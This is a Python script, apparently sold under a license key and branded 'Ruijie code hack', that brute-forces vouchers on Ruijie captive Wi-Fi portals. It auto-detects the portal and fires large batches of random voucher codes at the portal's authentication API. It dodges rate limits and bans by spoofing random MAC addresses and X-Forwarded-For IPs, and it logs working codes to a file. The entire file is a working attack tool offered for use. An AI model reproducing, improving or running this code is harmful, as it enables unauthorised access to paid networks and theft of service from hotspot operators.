#!/usr/bin/env python3
"""
Ruijie Voucher Scanner v15.0 - CLEAN UI EDITION
- Mix/Eng Optimized & Fast Speed
- Key System Integrated
- No Borders/Lines
"""

import os
import sys
import json
import asyncio
import aiohttp
import re
import time
import socket
import requests
import urllib3
import random
import string
import hmac
import hashlib
import base64
import shutil
import subprocess
import threading
import _thread
from datetime import datetime, date
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 🔐 LICENSE GUARD SYSTEM
# ==========================================
_SECRET = b"666d13e70e703b449557daa5813f5e3f"
EPOCH = date(2020, 1, 1)
ACTIVATE_WINDOW = 3
LIC_FILE = os.path.expanduser("~/.aruthua_license")
ID_FILE = os.path.expanduser("~/.aruthua_id")

RST = "\033[0m"
ANSI_RE = re.compile(r"\033\[[0-9;?]*[A-Za-z]")

def c(code, text, bold=False):
    return f"\033[{'1;' if bold else ''}38;5;{code}m{text}{RST}"

def dim(text):
    return c(244, text)

def vlen(s):
    return len(ANSI_RE.sub("", s))

def pad(s, n):
    return s + " " * max(0, n - vlen(s))

LOGO = [("▄▀█", "█▀█"), ("█▀█", "█▀▄"), ("█ █", "█▄█"), ("▀█▀", " █ "), ("█ █", "█▀█"), ("█ █", "█▄█"), ("▄▀█", "█▀█")]
LOGO_BIG = {
    "A": [" ███ ", "█   █", "█████", "█   █", "█   █"],
    "R": ["████ ", "█   █", "████ ", "█  █ ", "█   █"],
    "U": ["█   █", "█   █", "█   █", "█   █", " ███ "],
    "T": ["█████", "  █  ", "  █  ", "  █  ", "  █  "],
    "H": ["█   █", "█   █", "█████", "█   █", "█   █"],
}
WORD = "ARUTHUA"
GRAD = [51, 45, 39, 33, 99, 135, 171]

def center(s, w):
    return " " * max(0, (w - vlen(s)) // 2) + s

def box(title, rows, w, color=39):
    inner = w - 4
    top = c(color, "┌─ ") + c(color, title, True) + c(color, " " + "─" * (w - 5 - len(title)) + "┐")
    bot = c(color, "└" + "─" * (w - 2) + "┘")
    body = [c(color, "│") + " " + pad(r, inner) + " " + c(color, "│") for r in rows]
    return [top] + body + [bot]

def logo_lines(w):
    L = []
    if w >= 42:
        for row in range(5):
            line = " ".join(c(GRAD[i], LOGO_BIG[ch][row], True) for i, ch in enumerate(WORD))
            L.append(center(line, w))
    else:
        for row in (0, 1):
            line = " ".join(c(GRAD[i], LOGO[i][row], True) for i in range(len(LOGO)))
            L.append(center(line, w))
    L.append("")
    L.append(center(dim("─── ") + c(250, "Ruijie code hack", True) + dim(" ───"), w))
    L.append(center(c(213, "Owens ", True) + c(51, "@aruthua", True), w))
    L.append("")
    return L

def _sign(dev, payload):
    msg = dev + "|" + json.dumps(payload, sort_keys=True)
    return hmac.new(_SECRET, msg.encode(), hashlib.sha256).hexdigest()

def fmt_dt(ts):
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M")

def device_id():
    try:
        with open(ID_FILE) as f:
            v = f.read().strip()
        if re.fullmatch(r"\d{8,10}", v):
            return v
    except Exception:
        pass
    raw = ""
    try:
        raw = subprocess.run(["settings", "get", "secure", "android_id"], capture_output=True, text=True, timeout=5).stdout.strip()
    except Exception:
        pass
    if re.fullmatch(r"[0-9a-f]{16}", raw):
        n = int(hashlib.sha256(("aruthua:" + raw).encode()).hexdigest(), 16)
    else:
        n = int.from_bytes(os.urandom(8), "big")
    v = str(n % 9000000000 + 1000000000)
    try:
        with open(ID_FILE, "w") as f:
            f.write(v)
    except Exception:
        pass
    return v

def load_license(dev):
    try:
        with open(LIC_FILE) as f:
            d = json.load(f)
        sig = d.pop("sig", "")
        if hmac.compare_digest(sig, _sign(dev, d)):
            return d
    except Exception:
        pass
    return {}

def save_license(dev, d):
    body = {k: v for k, v in d.items() if k != "sig"}
    out = dict(body)
    out["sig"] = _sign(dev, body)
    try:
        with open(LIC_FILE, "w") as f:
            json.dump(out, f)
    except Exception:
        pass

def touch_license(lic, now):
    lic["st"]["last"] = now
    save_license(lic["dev"], lic["st"])

def parse_key(key, dev):
    k = re.sub(r"[^A-Z2-7]", "", key.upper())
    if len(k) != 24:
        return None, "Invalid key format"
    try:
        raw = base64.b32decode(k)
    except Exception:
        return None, "Invalid key format"
    issue = int.from_bytes(raw[:2], "big")
    days = int.from_bytes(raw[2:4], "big")
    tag = hmac.new(_SECRET, f"{dev}:{issue}:{days}".encode(), hashlib.sha256).digest()[:11]
    if days < 1 or not hmac.compare_digest(raw[4:], tag):
        return None, "Key is not valid for this device"
    return (issue, days, hashlib.sha256(k.encode()).hexdigest()[:16]), None

def activate(key, dev, st):
    parsed, err = parse_key(key, dev)
    if err:
        return None, err
    issue, days, kid = parsed
    if kid in st.get("used", []):
        return None, "This key was already used"
    today = (date.today() - EPOCH).days
    if today < issue - 1:
        return None, "Phone date is wrong. Set the correct date."
    if today > issue + ACTIVATE_WINDOW:
        return None, "This key is too old. Ask the owner for a new key."
    now = time.time()
    if now < st.get("last", 0) - 600:
        return None, "Phone date/time was changed. Set the correct time."
    return {
        "start": now,
        "end": now + days * 86400,
        "days": days,
        "last": now,
        "used": st.get("used", []) + [kid],
    }, None

def license_screen(dev, err=None):
    w = max(36, min(shutil.get_terminal_size((44, 24)).columns, 50))
    out = sys.stdout
    out.write("\033[2J\033[H")
    for line in logo_lines(w):
        out.write(line + "\n")
    out.write("\n")
    out.write(center(dim("Device ID  ") + c(226, dev, True), w) + "\n\n")
    if err:
        out.write(center(c(196, "x " + err, True), w) + "\n")
    out.write("\n")
    out.flush()

def license_gate():
    dev = device_id()
    st = load_license(dev)
    err = None
    now = time.time()
    if st.get("end"):
        if now < st.get("last", 0) - 600:
            err = "Phone date/time was changed. Set the correct time."
        elif now > st["end"]:
            err = "License expired on " + fmt_dt(st["end"])
        else:
            lic = {"dev": dev, "end": st["end"], "st": st}
            touch_license(lic, now)
            return lic
    while True:
        license_screen(dev, err)
        try:
            key = input(c(51, "Enter key ", True) + dim("(blank = exit)") + c(51, " > ", True)).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return None
        if not key:
            return None
        new, err = activate(key, dev, st)
        if not err:
            save_license(dev, new)
            print(c(82, f"\nActivated! {new['days']} day(s), until {fmt_dt(new['end'])}", True))
            time.sleep(1.5)
            return {"dev": dev, "end": new["end"], "st": new}

def watchdog(lic, state):
    while True:
        time.sleep(1)
        now = time.time()
        if now < lic["st"].get("last", 0) - 600:
            state["why"] = "Phone date/time was changed."
        elif now > lic["end"]:
            state["why"] = "License expired."
        if state.get("why"):
            _thread.interrupt_main()
            time.sleep(5)
            sys.stdout.write("\033[?25h\033[?1049l\033[0m\n")
            sys.stdout.flush()
            os._exit(3)
        if now - state["saved"] > 60:
            touch_license(lic, now)
            state["saved"] = now

# ==========================================
# 🚀 SCANNER CODE
# ==========================================
RL_SLEEP = 0.1
CONCURRENCY = 10
console = Console()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    logo_main = Text(justify="center")
    logo_main.append("A", style="bold cyan")
    logo_main.append("R", style="bold deep_sky_blue1")
    logo_main.append("U", style="bold blue")
    logo_main.append("T", style="bold medium_purple")
    logo_main.append("H", style="bold purple")
    logo_main.append("U", style="bold magenta")
    logo_main.append("A", style="bold deep_pink2")
    logo_main.append("\n\n─── ", style="dim white")
    logo_main.append("Ruijie code hack", style="bold white")
    logo_main.append(" ───\n", style="dim white")
    logo_main.append("Owens @aruthua", style="bold light_pink1")
    
    console.print(Align.center(logo_main))
    console.print()

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id',
        'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def auto_detect_portal():
    console.print(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")))
    console.print()
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            console.print(f"[bold green][+][/bold green] Detected via Connectivity Check!")
            return r.url
    except:
        pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    gateways = list(dict.fromkeys(gateways))

    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                return res.url
        except:
            pass

    return None

class VoucherScanner:
    def __init__(self):
        self.sid = None
        self.sign = None
        self.timestamp = None
        self.session_valid = False
        self.rate_limited = False
        self.mode = "num"
        
        self.current_mac = self.gen_random_mac()
        self.current_ip = f"192.168.110.{random.randint(2, 254)}"

        self._display_active = False
        self._live = None
        self._state = {
            'phase': '', 'conc': CONCURRENCY, 'batch': 1,
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'found': [], 'valid': [], 'sta': [], 'expired': [], 'captcha': [], 'rl': [],
            'status': None, 'session': None, 'current_code': ''
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": self.current_ip,
            "mac": self.current_mac, "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def apply_params_from_url(self, url):
        params = extract_params_from_url(url)
        for key, value in params.items():
            if key in self.params:
                self.params[key] = value
        self.params['mac'] = self.current_mac
        self.params['ip'] = self.current_ip

    def print_progress_bar(self, percentage, width=30):
        filled = int(width * percentage / 100)
        return '#' * filled + '-' * (width - filled)

    def gen_random_mac(self):
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def generate_voucher(self, length):
        if self.mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        elif self.mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif self.mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return str(random.randint(0, 10**length - 1)).zfill(length)

    def make_layout(self):
        s = self._state
        layout = Layout()
        
        # ဘောင်တွေ ဖြုတ်ပြီး Layout ကို ရိုးရှင်းအောင် ပြင်ထားပါတယ်
        layout.split_column(
            Layout(name="live", size=6),
            Layout(name="logs", size=4),
            Layout(name="hits", ratio=1),
        )

        if s['status']: status_text = Text(s['status'], style="bold yellow")
        else: status_text = Text("Active", style="bold green")

        # ဘယ်ဘက်ကပ် အရောင်စုံ စာသားများ
        live_text = Text(justify="left")
        live_text.append("Code     : ", style="bold cyan")
        live_text.append(f"{s['current_code']}\n", style="bold bright_green")
        
        live_text.append("Checked  : ", style="bold cyan")
        live_text.append(f"{s['checked']:,} / {s['total']:,}\n", style="bold bright_blue")
        
        live_text.append("Speed    : ", style="bold cyan")
        live_text.append(f"{s['speed']:,} /min\n", style="bold bright_yellow")
        
        live_text.append("MAC      : ", style="bold cyan")
        live_text.append(f"{self.current_mac[-8:]}  |  ", style="bold bright_red")
        live_text.append("IP: ", style="bold cyan")
        live_text.append(f"{self.current_ip[-3:]}\n", style="bold bright_red")
        
        live_text.append("Status   : ", style="bold cyan")
        live_text.append(f"{status_text}\n", style="bold bright_magenta")

        layout["live"].update(live_text)

        log_text = Text(justify="left")
        log_text.append("Session  : ", style="bold cyan")
        log_text.append(f"{s['session'][:15] if s['session'] else 'None'}...\n", style="bold white")
        
        bar_len = 30
        filled = int(bar_len * s['percentage'] / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        log_text.append("Progress : ", style="bold cyan")
        log_text.append(f"[{bar}] {s['percentage']:.2f}%\n", style="bold bright_magenta")
        layout["logs"].update(log_text)

        hits_table = Table(show_header=False, expand=True, box=None)
        hits_table.add_column("Code", justify="left", width=25)
        hits_table.add_column("Status", justify="left")
        
        all_hits = []
        for v in s['found']: all_hits.append({"code": v, "type": "FOUND"})
        for v in s['valid']: all_hits.append({"code": v, "type": "VALID"})
        all_hits.reverse()

        for hit in all_hits:
            if hit['type'] in ["FOUND", "VALID"]:
                hits_table.add_row(
                    f"[bold green]CODE    ⚡ {hit['code']}[/bold green]",
                    "[green]VALID[/green]"
                )

        if not all_hits:
            hits_table.add_row("", "[dim]No hits yet...[/dim]")

        layout["hits"].update(hits_table)
        return layout

    def _render(self):
        if not self._display_active: return
        try: self._live.update(self.make_layout())
        except: pass

    def _set_status(self, msg):
        if self._display_active:
            self._state['status'] = msg
            self._render()
        else:
            console.print(msg)

    def _clear_status(self):
        if self._display_active:
            self._state['status'] = None

    async def get_session_id(self, session, force_refresh=False):
        if not force_refresh and self.sid and self.session_valid:
            return self.sid

        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        if "portal-mm-as" in str(self.params.get("url", "")):
            base_url = base_url.replace("portal-as", "portal-mm-as")

        attempt = 0
        while attempt < 5:
            attempt += 1
            
            if self.rate_limited or attempt > 2:
                self.current_mac = self.gen_random_mac()
                self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                self.rate_limited = False
                self._set_status(f"New MAC: {self.current_mac[-8:]}")
            else:
                self._set_status(f"MAC: {self.current_mac[-8:]}")

            temp_params = self.params.copy()
            temp_params['mac'] = self.current_mac
            temp_params['ip'] = self.current_ip

            params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
            full_url = f"{base_url}?{params_str}"

            headers = {
                'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{self.current_mac}',
                'Client-Mac': self.current_mac,
                'X-Forwarded-For': self.current_ip,
                'Connection': 'close'
            }

            try:
                session.cookie_jar.clear()
                async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
                    location = resp.headers.get('Location', '')
                    
                    if not location:
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    loc_lower = location.lower()
                    if "request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower:
                        self._set_status(f"Ban Detected! Spoofing new MAC...")
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    query = parse_qs(urlparse(location).query)
                    sid = query.get('sessionId', [None])[0]
                    if sid:
                        self.sid = sid
                        self.sign = query.get('sign', [None])[0]
                        self.timestamp = query.get('timestamp', [None])[0]
                        self.session_valid = True
                        self._state['session'] = sid
                        self._clear_status()
                        self._render()
                        return sid
                    
                    await asyncio.sleep(RL_SLEEP)
            except Exception:
                await asyncio.sleep(RL_SLEEP)
        
        self._set_status("Failed SID. Retrying later...")
        await asyncio.sleep(1)
        return None

    async def validate_voucher(self, session, voucher, mode="scan"):
        if not await self.get_session_id(session, force_refresh=False):
            return 'RATE_LIMITED', None, "No session"

        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        if self.sign and self.timestamp:
            url += f"&sign={self.sign}&timestamp={self.timestamp}"

        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12)",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={self.sid}",
        }

        for attempt in range(1, 4):
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            if self.sign: payload["sign"] = self.sign
            if self.timestamp: payload["timestamp"] = self.timestamp

            try:
                async with session.post(url, json=payload, headers=headers, ssl=False, timeout=10, allow_redirects=True) as resp:
                    text = await resp.text()
                    final_url = str(resp.url)

                    if "request%20limited" in final_url.lower() or "request limited" in final_url.lower():
                        self.session_valid = False
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        return 'RATE_LIMITED', None, "Request limited"

                    try: result = json.loads(text)
                    except: result = {}

                    message = str(result.get("message", ""))
                    msg_lower = message.lower()

                    if "request limited" in msg_lower or "too many" in msg_lower:
                        self.session_valid = False
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        return 'RATE_LIMITED', None, message

                    if "session timed out" in msg_lower or "invalid session" in msg_lower:
                        self.session_valid = False
                        await self.get_session_id(session, force_refresh=True)
                        continue

                    if "sta limit" in msg_lower: return 'STA_LIMIT', None, message
                    if "expired" in msg_lower: return 'EXPIRED', None, message
                    if "authentication failed" in msg_lower or "incorrect" in msg_lower: return 'INVALID', None, message

                    if result.get("success") is True and isinstance(result.get("result"), dict):
                        logon_url = result["result"].get("logonUrl")
                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")
                    
                    if '"result":0' in text or '"result": 0' in text or '"error":null' in text:
                        logon_url = result.get("result", {}).get("logonUrl") if isinstance(result.get("result"), dict) else None
                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")

                    return 'INVALID', None, message or "Unknown"
            except Exception:
                self.session_valid = False
                await asyncio.sleep(0.2)
        return 'INVALID', None, "Max retries"

    def save_found(self, voucher: str, status: str, logon_url: str = ""):
        ts = get_timestamp()
        with open("found_ruijie.txt", "a") as f:
            if status == "FOUND": f.write(f"[{ts}] {voucher} -> {logon_url}\n")
            elif status == "VALID": f.write(f"[{ts}] {voucher} -> VALID\n")

    async def run_phase(self, session, phase_name, total_codes, length, delay):
        self._state.update({
            'phase': phase_name, 'conc': CONCURRENCY, 'batch': 1,
            'total': total_codes, 'checked': 0, 'speed': 0, 'percentage': 0,
            'status': None, 'session': self.sid, 'current_code': '----'
        })
        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=10, screen=True)
        self._live.start()

        start_time = time.time()
        tested_count = 0
        
        semaphore = asyncio.Semaphore(CONCURRENCY)

        async def bounded_check(v):
            async with semaphore:
                res = await self.validate_voucher(session, v, mode="scan")
                if delay > 0:
                    await asyncio.sleep(delay)
                return v, res

        try:
            batch = []
            for _ in range(total_codes):
                voucher = self.generate_voucher(length)
                batch.append(voucher)

                if len(batch) >= CONCURRENCY:
                    tasks = [bounded_check(v) for v in batch]
                    results = await asyncio.gather(*tasks)
                    
                    for v, res in results:
                        tested_count += 1
                        status, logon_url, message = res
                        
                        if status == 'FOUND':
                            self._state['found'].append(v)
                            self.save_found(v, "FOUND", logon_url)
                            self.session_valid = False
                            self.current_mac = self.gen_random_mac()
                            self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                            await self.get_session_id(session, force_refresh=True)
                        elif status == 'VALID':
                            self._state['valid'].append(v)
                            self.save_found(v, "VALID", "")
                            self.session_valid = False
                            self.current_mac = self.gen_random_mac()
                            self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                            await self.get_session_id(session, force_refresh=True)
                        elif status == 'RATE_LIMITED':
                            self.rate_limited = True

                    self._state['current_code'] = batch[-1]
                    self._state['checked'] = tested_count
                    
                    elapsed = time.time() - start_time
                    self._state['speed'] = int(tested_count / elapsed * 60) if elapsed > 0 else 0
                    self._state['percentage'] = (tested_count / total_codes) * 100
                    
                    self._render()
                    batch.clear()

        finally:
            self._display_active = False
            self._live.stop()
            console.print(f"\n[bold green]COMPLETED: {phase_name}[/bold green]")

    async def run_cascading_scan(self, session, length):
        if length == 6: total_p1 = 100000
        elif length == 7: total_p1 = 500000
        else: total_p1 = 1000000

        console.print(f"[bold yellow][!][/bold yellow] Mode: {self.mode.upper()} - Max Speed Started\n")

        await self.run_phase(
            session, "Phase 1 (Max Speed)", 
            total_codes=total_p1, 
            length=length,
            delay=0.0 
        )

        console.print(f"[bold green]SCAN COMPLETED! Check 'found_ruijie.txt'.[/bold green]")

async def main():
    clear_screen()
    
    lic = license_gate()
    if not lic:
        sys.exit(1)

    show_banner()
    scanner = VoucherScanner()

    portal_url = auto_detect_portal()
    
    if portal_url:
        scanner.apply_params_from_url(portal_url)
        console.print(f"[bold green][+][/bold green] URL fetched successfully!")
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed. Please paste URL manually.")
        url_input = input("👉 Paste URL: ").strip()
        if not url_input:
            return
        scanner.apply_params_from_url(url_input)

    async with aiohttp.ClientSession() as session:
        console.print("\n[bold green]Choose Scan Type:[/bold green]")
        console.print("  [bold green]1. NUM (0-9)[/bold green]")
        console.print("  [bold green]2. ENG (a-z)[/bold green]")
        console.print("  [bold green]3. MIX (a-z + 0-9)[/bold green]\n")
        
        scan_type = input("👉 ").strip()
        
        if scan_type == "1": scanner.mode = "num"
        elif scan_type == "2": scanner.mode = "eng"
        elif scan_type == "3": scanner.mode = "mix"
        else: scanner.mode = "num"

        lc = input("👉 Voucher length (6/7/8) [6]: ").strip()
        length = int(lc) if lc in ['7', '8'] else 6
        
        state = {"saved": time.time()}
        threading.Thread(target=watchdog, args=(lic, state), daemon=True).start()
        
        await scanner.run_cascading_scan(session, length)

    console.print("\n[bold green]Done![/bold green]")
    input("[blue][*][/blue] Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Interrupted by user[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        import traceback
        traceback.print_exc()